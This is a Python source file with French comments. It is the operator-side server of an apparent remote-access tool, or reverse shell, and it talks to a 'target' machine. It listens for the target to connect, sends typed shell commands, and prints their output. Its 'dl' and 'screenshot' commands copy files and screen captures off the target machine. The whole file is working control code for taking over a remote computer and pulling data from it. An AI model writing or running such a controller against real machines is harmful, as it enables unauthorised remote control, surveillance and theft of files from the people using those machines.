# Serveur qui va communiquer avec la machine cible : client

import socket
import dataProtocol
HOST_IP = "127.0.0.1"
HOST_PORT = 32561
NB_OCTET_DATA = 12

# on cree le canal d'initialisation
canal_init = socket.socket()
canal_init.bind((HOST_IP, HOST_PORT))   # association du canal a l'adresse du serveur
canal_init.listen()     # le canal est en ecoute

# le canal de connexion est etabli lorsqu'un client se connect
# accept() est une fonction bloquante qui retourne le canal et l'adresse du client connecte
print("En attente de connexion")
canal_connexion, client_adresse = canal_init.accept()
# connexion reussi si on arrive a ce niveau
print(f"Le client {client_adresse} est connecte")

# on peut effectuer nos echanges avec le client
while True:
    cmd = input("Cible >   ")
    if cmd == "#exit":  # quitter le programme
        break
    elif cmd != "":
        canal_connexion.sendall(cmd.encode())
        # reception des donnees
        # les donnees sont envoyees en 2 partie : l'entete qui comporte la taille des donnees puis les donnees
        header_data = dataProtocol.recieve_data(canal_connexion, NB_OCTET_DATA)    # entete
        if not header_data:     # si on recoit un header vide on recommence la boucle en ignoreant la suite du code
            continue
        taille_header_data = int(header_data.decode())
        data_recu = dataProtocol.recieve_data(canal_connexion, taille_header_data)     # donnees recues
        if data_recu:
            cmd_split = cmd.split(" ")
            if len(cmd_split) > 1 and (cmd_split[0] == "dl" or cmd_split[0] == "screenshot"):
                nom_fichier = " ".join(cmd_split[1:])
                if len(data_recu) == 1 and data_recu == b"0":   # si le fichier n'existe pas chez le client
                    print(f"{nom_fichier} introuvable")
                    continue
                fichier = open(nom_fichier, "wb")
                fichier.write(data_recu)
                fichier.close()
                print(f"{nom_fichier} a ete telecharge")
            else:
                print(data_recu.decode())   # si c'est une autre commande tapee sur le serveur

# on ferme les canaux
canal_init.close()
canal_connexion.close()
